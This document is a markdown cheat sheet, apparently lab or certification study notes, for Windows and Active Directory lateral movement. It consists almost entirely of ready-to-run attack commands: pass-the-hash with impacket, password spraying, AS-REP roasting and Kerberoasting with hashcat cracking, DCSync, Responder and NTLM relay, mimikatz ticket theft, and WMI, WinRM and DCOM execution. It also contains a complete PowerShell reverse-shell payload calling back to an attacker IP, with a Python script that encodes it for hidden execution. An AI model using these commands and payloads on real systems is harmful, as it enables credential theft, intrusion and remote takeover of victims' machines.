
## RCE
### Passwords - Yes, NTLM - Yes, SMB- Open, Admin Account - Yes. ADMIN$ share
```
- wmiexec
	- impacket-wmiexec domain/username:password@hot-ip
	- impacket-wmiexec -hashes :[ntlm hash] username@ip
		- impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.21
- psexec
	- impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.21
- proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240

(psexec also works for windows - ./psexec64.exe -i \\FILES04 -u corp\jen -p <password> cmd)
```

### Password - No, NTLM- Yes, SMB - Open
```
- smbclient
	- `smbclient \\\\192.168.223.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`
```

### If bind shell is not returning output (Required port 5986 and 5985)
```
- evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!
```



# External Access
### Spray For Access, or Access through SMB
```
- crackmapexec smb hosts.txt -u <username> -p 'Nexus123!' -d corp.com --continue-on-success
```

### AS-REP Roast for Other Users NTLM hashes. Need password.
```
- impacket-GetNPUsers -dc-ip <IP address> -request -outputfile <filename> corp.com/pete
- Or on Windows run rubeus. Doesn't require auth!!
```

### DC Sync for other Users NTLM hashes. Need pw.
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"Password"@<DC IP>
```
## Kerberoasting
**NOTE: sometimes impacket may produce different hashes to mimikatz**
```
- Externally: sudo impacket-GetUserSPNs -request -dc-ip <DC's IP> corp.com/pete
- Internally: rubeus.com kerberoast /outfile:outfile-name

- sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### No Admin on box for Mimikatz?
- Crack NTLM2 and perform Relay attacks
```
- Setup responder on attacker
	- sudo responder -I tun0
- On victim, search the non-existant SMB
	- C:\Windows\system32>dir \\192.168.45.159\test
```

### Can't Crack the Hash from Above?
- Try a relay attack and pass the hash on to hit another target with powershell reverse shell
```
- On attacker
	- impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
- On victim
	- dir \\attacker-ip\whatever
```

### WMI Internal Commands, Requires port 135
```
- C:\Users\Jeff>wmic /node:192.168.50.73 /user:jen /password:<password>! process call create "calc"

- Getting a rev shell
	- $username = 'jen';
	- $password = 'Nexus123!';
	- ConvertTo-SecureString $password -AsPlaintext -Force;
	- $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
	- $Options = New-CimSessionOption -Protocol DCOM
	- $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
	- $Command = 'powershell -nop -w hidden -e <base 64 encoded command>';
	- Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
VV User this python script to get a base64 encoded revshell for the payload
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

### WinRM, Requires port 5986 and 5985 + Username and password
```
 - C:\Users\jeff>winrs -r:file04 -u:jen -p:<password> "cmd /c hostname & whoami"
 - Can also paste in powershell base64 encoded revshell with "powershell -nop -w hidden -e <base64 command>"
```

### Overpass The Hash
**Note: can right click an applicataion and run as user. After succesful authentication, their creds will be cached**
```
- Turn another users NTLM into a kerberos ticket
- sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
	- Spawns powershell locally on machine in use, can then .\psexec.exe to another machine if necessary
```

### Pass the Ticket
- Steal someone elses active ticket to a service we can't access and inject it into our session
```
- sekurlsa::tickets /export
- dir *.kirbi
- in mimikatz:
	- kerberos::ptt [0;12db0]-0-0-40810000-dave@cifs-web04.kirbi
- klist
- ls \\web04\backup
```


### DCOM
```
- In elevated cmd session:
	- $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
	- $dcom.Document.ACtiveView.ExecuteShellCommand("powershell",$null,"Powershell -nop -w hidden -r <base64-encoded-payload>","7")
- On attacker - run nc obviously
```